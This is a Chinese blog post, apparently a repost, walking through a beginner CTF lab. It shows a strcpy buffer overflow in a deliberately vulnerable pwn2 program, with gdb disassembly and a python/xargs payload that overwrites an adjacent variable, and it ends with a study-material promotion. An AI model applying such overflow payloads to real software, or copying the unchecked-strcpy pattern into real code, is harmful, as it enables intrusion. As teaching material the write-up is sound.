<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>CTF PWN之精确覆盖变量数据 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="CTF PWN之精确覆盖变量数据" />
<meta property="og:description" content="刚开始接触pwn的朋友在做pwn练习时可能会有这样的疑问，怎么做到精确覆盖变量数据呢？
我们做pwn练习之前需要先知道：命令行参数C语言的main函数拥有两个参数，为int类型的argc参数，以及char**类型argv参数。其中argc参数的值表示命令行参数的个数，而argv则指向一个字符串数组，该数组存储了具体的命令行参数的内容。
这里就用今天的实验，给大家介绍一下！
本文涉及相关实验：[《CTF
PWN练习之精确覆盖变量数据》](https://www.hetianlab.com/expc.do?ec=ECID172.19.104.182014110113362900001&amp;pk_campaign=freebuf-
wemedia)（在掌握大小端字节序表示法的基础上，通过精心构造的输入数据溢出缓冲区，实现对modified变量的值进行精确覆盖，以达到修改程序执行逻辑的目的。）
看下面的例子 打印命令行参数信息的示例代码（位于/home/test/2目录下）：#include &lt;stdio.h&gt;int main(int argc, char** argv){int i;for (i = 0; i &lt; argc; &#43;&#43;i){printf(“argv[%d] = %s\n”, i, argv[i]);}return 0;}
注意程序本身的名字为命令行的第一个参数。编译这段代码生成test程序，然后在命令行下执行，尝试传入命令行参数，如：./test hello world
cmdline，可以看到程序打印出了具体的命令行参数信息：
xargs命令Linux的xargs命令可以将输入数据当做命令行参数传给指定的程序。比如执行命令python -c “print ‘AAA BBB
CCC’” | xargs ./test后，输出：
python语句执行后输出AAA BBB
CCC，通过管道操作作为xargs命令的输入，而xargs将其作为test程序的命令行参数，因此test程序会把这些信息打印出来。
小白：就是我们借助xargs可以把输入数据当成命令行参数输给这个程序。
大东:对的，另外还需要讲的是一个字节序
字节顺序，又称端序或尾序（英语：Endianness）。对于内存中存储的0x11223344这样一个值，从低地址往高地址方向的每一个字节来看，其内容在内存里的分布可能为0x11,0x22,0x33,0x44，也可能为0x44,0x33,0x22,0x11。
这就涉及到两种存储规则：大端格式和小端格式。示意图如下图所示：
0x11223344中的最高的字节为0x11，最低的字节为0x44，我们只要记住小端格式是“高存高，低存低”的规律，就很好的理解了。即小端格式中，高位字节存储于内存的高地址处，而低位字节存储于内存的低地址处。
Intel、AMD等系列的处理器都是小端格式的。
题目描述：
主机/home/test/2目录下有一个pwn2程序，这个程序会对传入的命令行参数进行处理，通过构造特定的命令行参数数据可以对程序发起溢出攻击，成功会提示
Congratulations, you pwned it. ，失败则会提示**Please try again.**的提示信息。
第一步源码审计使用cd /home/test/2切换到程序所在目录，执行cat pwn2.c即可看到源代码：#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char** argv){int modified;char buffer[64];if (argc == 1){printf(“please specify an argument\n”);exit(1);}modified = 0;strcpy(buffer, argv[1]); // 引发缓冲区溢出if (modified == 0x61626364){printf(“Congratulations, you pwned it." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/5c82e4722db4d5e8ccf83524d0628d61/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-08-09T20:31:31+08:00" />
<meta property="article:modified_time" content="2023-08-09T20:31:31+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">CTF PWN之精确覆盖变量数据</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>刚开始接触pwn的朋友在做pwn练习时可能会有这样的疑问，怎么做到精确覆盖变量数据呢？</p> 
<p>我们做pwn练习之前需要先知道：命令行参数C语言的main函数拥有两个参数，为int类型的argc参数，以及char**类型argv参数。其中argc参数的值表示命令行参数的个数，而argv则指向一个字符串数组，该数组存储了具体的命令行参数的内容。</p> 
<p>这里就用今天的实验，给大家介绍一下！</p> 
<p><strong>本文涉及相关实验：</strong>[《CTF<br> PWN练习之精确覆盖变量数据》](https://www.hetianlab.com/expc.do?ec=ECID172.19.104.182014110113362900001&amp;pk_campaign=freebuf-<br> wemedia)（在掌握大小端字节序表示法的基础上，通过精心构造的输入数据溢出缓冲区，实现对modified变量的值进行精确覆盖，以达到修改程序执行逻辑的目的。）</p> 
<p>看下面的例子 打印命令行参数信息的示例代码（位于/home/test/2目录下）：#include &lt;stdio.h&gt;int main(int argc, char** argv){int i;for (i = 0; i &lt; argc; ++i){printf(“argv[%d] = %s\n”, i, argv[i]);}return 0;}</p> 
<p>注意程序本身的名字为命令行的第一个参数。编译这段代码生成test程序，然后在命令行下执行，尝试传入命令行参数，如：./test hello world<br> cmdline，可以看到程序打印出了具体的命令行参数信息：</p> 
<p><img src="https://images2.imgbox.com/5b/0d/wFfKZHGA_o.jpg" alt="图片1.png"></p> 
<p>xargs命令Linux的xargs命令可以将输入数据当做命令行参数传给指定的程序。比如执行命令python -c “print ‘AAA BBB<br> CCC’” | xargs ./test后，输出：</p> 
<p><img src="https://images2.imgbox.com/39/21/FRPDMAdZ_o.jpg" alt="图片2.png"></p> 
<p>python语句执行后输出AAA BBB<br> CCC，通过管道操作作为xargs命令的输入，而xargs将其作为test程序的命令行参数，因此test程序会把这些信息打印出来。</p> 
<p>小白：就是我们借助xargs可以把输入数据当成命令行参数输给这个程序。</p> 
<p>大东:对的，另外还需要讲的是一个字节序<br> 字节顺序，又称端序或尾序（英语：Endianness）。对于内存中存储的0x11223344这样一个值，从低地址往高地址方向的每一个字节来看，其内容在内存里的分布可能为0x11,0x22,0x33,0x44，也可能为0x44,0x33,0x22,0x11。</p> 
<p>这就涉及到两种存储规则：大端格式和小端格式。示意图如下图所示：</p> 
<p><img src="https://images2.imgbox.com/ed/0a/37oHscEe_o.jpg" alt="图片3.png"></p> 
<p>0x11223344中的最高的字节为0x11，最低的字节为0x44，我们只要记住小端格式是“高存高，低存低”的规律，就很好的理解了。即小端格式中，高位字节存储于内存的高地址处，而低位字节存储于内存的低地址处。</p> 
<p>Intel、AMD等系列的处理器都是小端格式的。</p> 
<p>题目描述：</p> 
<p>主机/home/test/2目录下有一个pwn2程序，这个程序会对传入的命令行参数进行处理，通过构造特定的命令行参数数据可以对程序发起溢出攻击，成功会提示<br> <strong>Congratulations, you pwned it.</strong> ，失败则会提示**Please try again.**的提示信息。</p> 
<p>第一步源码审计使用cd /home/test/2切换到程序所在目录，执行cat pwn2.c即可看到源代码：#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char** argv){int modified;char buffer[64];if (argc == 1){printf(“please specify an argument\n”);exit(1);}modified = 0;strcpy(buffer, argv[1]); // 引发缓冲区溢出if (modified == 0x61626364){printf(“Congratulations, you pwned it.\n”);}else{printf(“Please try again, you got 0x%08X\n”, modified);}return 0;}</p> 
<p>这源码要怎么pwn掉它呢？</p> 
<p>我们可以尝试一个姿势，使用strcpy函数复制字符串时，并不会对目标缓冲区的长度进行检查，当源字符串的长度超过目标缓冲区的长度时会引发缓冲区溢出。这里当输入的超长的命令行参数数据时，将会产生缓冲区溢出，数据覆盖buffer后会继续覆盖modified变量。</p> 
<p>这个程序有一个条件modified ==，那么要多少才能pwn出去呢？0x61626364</p> 
<p>我们来继续分析，执行gdb pwn2即可开始通过gdb对pwn2进行调试，现在我们需要阅读main函数的汇编代码，在gdb中执行disas<br> main命令即可：</p> 
<p><strong>下面是对main函数中的汇编代码的解释</strong> ：</p> 
<blockquote> 
 <p>0x080482a0 &lt;+0&gt;: push %ebp</p> 
 <p>0x080482a1 &lt;+1&gt;: mov %esp,%ebp</p> 
 <p>0x080482a3 &lt;+3&gt;: and $0xfffffff0,%esp</p> 
 <p>; esp = esp - 0x60，即在栈上分配0x60）字节的空间</p> 
 <p>0x080482a6 &lt;+6&gt;: sub $0x60,%esp</p> 
</blockquote> 
<p>; 判断命令行参数的个数是否为1</p> 
<blockquote> 
 <p>0x080482a9 &lt;+9&gt;: cmpl $0x1,0x8(%ebp)</p> 
 <p>0x080482ad &lt;+13&gt;: jne 0x80482c7 &lt;main+39&gt;</p> 
 <p>0x080482af &lt;+15&gt;: movl $0x80b3dac,(%esp)</p> 
 <p>0x080482b6 &lt;+22&gt;: call 0x80493c0</p> 
 <p>0x080482bb &lt;+27&gt;: movl $0x1,(%esp)</p> 
 <p>0x080482c2 &lt;+34&gt;: call 0x8048e90</p> 
 <p>; 命令参数个数不是1，说明传入了命令行参数</p> 
 <p>; modified变量位于esp + 0x5C处，将其初始化为0</p> 
 <p>0x080482c7 &lt;+39&gt;: movl $0x0,0x5c(%esp)</p> 
 <p>; 通过ebp + 0xC获取argv参数的值</p> 
 <p>0x080482cf &lt;+47&gt;: mov 0xc(%ebp),%eax</p> 
 <p>; eax = eax + 4</p> 
 <p>0x080482d2 &lt;+50&gt;: add $0x4,%eax</p> 
 <p>; 取argv[1]的值</p> 
 <p>0x080482d5 &lt;+53&gt;: mov (%eax),%eax</p> 
 <p>; 将argv[1]作为strcpy的第二个参数值</p> 
 <p>0x080482d7 &lt;+55&gt;: mov %eax,0x4(%esp)</p> 
 <p>; buffer位于esp + 0x1C处，buffer作为strcpy的第一个参数值</p> 
 <p>0x080482db &lt;+59&gt;: lea 0x1c(%esp),%eax</p> 
 <p>0x080482df &lt;+63&gt;: mov %eax,(%esp)</p> 
 <p>; 调用strcpy进行字符串复制</p> 
 <p>0x080482e2 &lt;+66&gt;: call 0x80525b0</p> 
 <p>; 判断modified的值是否为0x61626364</p> 
 <p>0x080482e7 &lt;+71&gt;: cmpl $0x61626364,0x5c(%esp)</p> 
 <p>; 不相等则跳转并输出失败信息</p> 
 <p>0x080482ef &lt;+79&gt;: jne 0x80482ff &lt;main+95&gt;</p> 
 <p>; 输出成功提示信息</p> 
 <p>0x080482f1 &lt;+81&gt;: movl $0x80b3dc8,(%esp)</p> 
 <p>0x080482f8 &lt;+88&gt;: call 0x80493c0</p> 
 <p>0x080482fd &lt;+93&gt;: jmp 0x8048314 &lt;main+116&gt;</p> 
 <p>0x080482ff &lt;+95&gt;: mov $0x80b3de8,%eax</p> 
 <p>0x08048304 &lt;+100&gt;: mov 0x5c(%esp),%edx</p> 
 <p>0x08048308 &lt;+104&gt;: mov %edx,0x4(%esp)</p> 
 <p>0x0804830c &lt;+108&gt;: mov %eax,(%esp)</p> 
 <p>0x0804830f &lt;+111&gt;: call 0x8049390</p> 
 <p>0x08048314 &lt;+116&gt;: mov $0x0,%eax</p> 
 <p>0x08048319 &lt;+121&gt;: leave</p> 
 <p>0x0804831a &lt;+122&gt;: ret</p> 
</blockquote> 
<h2><a id="bufferesp0x1Cmodifiedesp0x5C0x5C__0x1C_144"></a>通过对上面的汇编代码进行分析，我们知道buffer位于esp+0x1C处，而modified位于esp+0x5C处，两个地址的距离为0x5C - 0x1C</h2> 
<p>0x40，即64，刚好为buffer数组的大小。因此当我们输入的数据超过64字节时，modified变量就可以被覆盖，但需要控制modified变量的值还需要小心的构造命令行参数。</p> 
<p>下面在gdb中进行验证，在gdb中执行b * 0x080482e7命令对strcpy的下一条指令下一个断点：</p> 
<p><img src="https://images2.imgbox.com/89/cc/54VpxCf6_o.jpg" alt="图片5.png"></p> 
<p>在gdb中执行r命令，如下（r后面的数据为64个A以及1234）：</p> 
<p>r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1234</p> 
<p>即r命令后加上空格可以接一个命令行参数，用于传递给被调试的程序。按下Enter键程序就在断点处断下了：</p> 
<p><img src="https://images2.imgbox.com/30/ff/FpatLm61_o.jpg" alt="图片6.png"></p> 
<p>在gdb中输入x<br> $esp+0x5C，查看modified变量的值已经被修改成了0x34333231，而0x31为字符’1’的ASCII值，0x32为字符’2’的ASCII值，0x33为字符’3’的ASCII值，0x34为字符’4’的ASCII值：</p> 
<p><img src="https://images2.imgbox.com/35/87/m3Tbz8aR_o.jpg" alt="图片7.png"></p> 
<p>使用x /4xb<br> $esp+0x5C命令，以字节为单位查看内存中0x34333231的表示（其中/4xb用于控制输出格式，4表示4个长度单位，x表示以16进制方式显示，b表示单位为字节）：</p> 
<p><img src="https://images2.imgbox.com/67/6a/ggf9ZFkw_o.jpg" alt="图片8.png"></p> 
<p>现在modified变量的值已经被修改成0x34333231了，结合我们的输入数据‘A….A1234’，1234为低地址往高地址方向，可以判断这是小端格式的表示法。</p> 
<p>在gdb中输入c命令就可以让程序继续执行，看到输出了错误的提示信息：</p> 
<p><img src="https://images2.imgbox.com/ea/0f/r1Vi9SzA_o.jpg" alt="图片9.png"></p> 
<p>现在我们只要合理控制命令行参数的第65~68字节的内容，就可以成功发起溢出攻击了。</p> 
<p>通过上面的步骤我们已经知道，只要合理控制命令行参数的第65~68字节的内容，就可以成功发起溢出攻击了。因为目标机器采用小端格式存储数据，而if语句分支要求modified的值为0x61626364时才通过判断，因此我们构造的数据应该为\x64\x63\x62\x61。如果你还没有退出gdb，输入q命令就可以退出gdb。下面通过python语句构造输入数据，然后通过xargs传给pwn2程序，执行命令：python -c “print ‘A’*64+‘\x64\x63\x62\x61’” | xargs ./pwn2</p> 
<p><img src="https://images2.imgbox.com/55/e1/b8KI5WVV_o.jpg" alt="图片10.png"></p> 
<p>看到已经成功发起了溢出攻击，程序被PWN掉啦！</p> 
<p>其实0x61为字符a的ASCII值，因此输入如下的命令同样能达到攻击效果：python -c “print ‘A’*64+‘dcba’” | xargs ./pwn2</p> 
<p><img src="https://images2.imgbox.com/8a/a9/5kRv8nCR_o.jpg" alt="图片11.png"></p> 
<p>这次的实验真的很费脑筋，分析处理了好多数据，才得到结果。</p> 
<p>看到已经成功发起了溢出攻击，程序被PWN掉啦！</p> 
<p>其实0x61为字符a的ASCII值，因此输入如下的命令同样能达到攻击效果：python -c “print ‘A’*64+‘dcba’” | xargs ./pwn2</p> 
<p>[外链图片转存中…(img-SNjX496F-1691584274873)]</p> 
<p>这次的实验真的很费脑筋，分析处理了好多数据，才得到结果。</p> 
<h3><a id="_199"></a>最后</h3> 
<p>对于从来没有接触过网络安全的同学，我们帮你准备了详细的学习成长路线图。可以说是最科学最系统的学习路线，大家跟着这个大的方向学习准没问题。<br> <img src="https://images2.imgbox.com/81/42/Whvoeog3_o.png" alt=""><br> 同时每个成长路线对应的板块都有配套的视频提供：<br> <img src="https://images2.imgbox.com/ac/61/zuHm1PBo_o.png" alt=""><br> <img src="https://images2.imgbox.com/40/fb/LWTJ7fpt_o.png" alt=""><br> 当然除了有配套的视频，同时也为大家整理了各种文档和书籍资料&amp;工具，并且已经帮大家分好类了。<br> <img src="https://images2.imgbox.com/ab/cb/NTlt2OSA_o.png" alt=""><br> <strong>因篇幅有限，仅展示部分资料，有需要的小伙伴，可以【点下方卡片】免费领取：</strong></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/5c362f7a17bbb4197862071837f6b567/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">在virtualbox中嵌套安装虚拟机时发生严重错误的解决办法</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/3e22d5481d6bd313436a440e39508307/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">【slam】视觉slam十四讲笔记</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>